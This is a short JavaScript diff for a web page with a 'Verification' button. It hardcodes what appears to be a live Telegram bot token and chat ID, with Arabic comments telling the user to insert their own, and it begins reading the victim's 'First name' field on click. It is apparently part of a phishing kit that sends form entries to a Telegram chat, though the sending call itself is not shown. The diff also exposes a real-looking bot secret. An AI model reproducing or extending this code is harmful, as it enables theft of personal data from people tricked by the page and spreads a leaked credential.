@@ -1,8 +1,9 @@
 document.querySelector("button").addEventListener("click", function() {
     alert("Verification clicked!");
 });
-const botToken = "YOUR_BOT_TOKEN";  //  7719751525:AAG3Nlfn9obc5pjJGAuVUUbn8ZKjczhz0tw
-const chatId = "YOUR_CHAT_ID";  //  7696290146
+
+const botToken = "7719751525:AAG3Nlfn9obc5pjJGAuVUUbn8ZKjczhz0tw";  // استبدل هذا بالتوكن الفعلي الخاص بك
+const chatId = "7696290146";  // استبدل هذا بمعرف الدردشة الفعلي الخاص بك
 
 document.querySelector("button").addEventListener("click", function() {
     const firstName = document.querySelector("input[placeholder='First name']").value;
